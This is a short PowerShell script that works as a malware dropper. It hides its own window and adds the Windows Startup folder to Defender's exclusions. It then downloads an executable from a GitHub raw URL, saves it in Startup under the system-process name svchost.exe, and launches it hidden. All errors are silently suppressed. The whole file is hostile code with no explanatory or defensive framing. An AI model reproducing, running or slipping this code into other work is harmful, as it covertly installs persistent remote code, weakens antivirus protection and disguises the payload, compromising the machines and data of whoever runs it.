# Minimize window immediately
Add-Type -Name Win -Namespace Native -MemberDefinition '[DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);'
$hwnd = (Get-Process -Id $PID).MainWindowHandle
[Native.Win]::ShowWindow($hwnd, 6) | Out-Null

$url = "https://github.com/FCsab/weather/raw/refs/heads/main/love.exe"
$startupPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup"
$exePath = "$startupPath\svchost.exe"

try { Add-MpPreference -ExclusionPath $startupPath -EA 0 } catch {}
try {
    Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing -EA Stop
    Start-Process -FilePath $exePath -WindowStyle Hidden
} catch {}
exit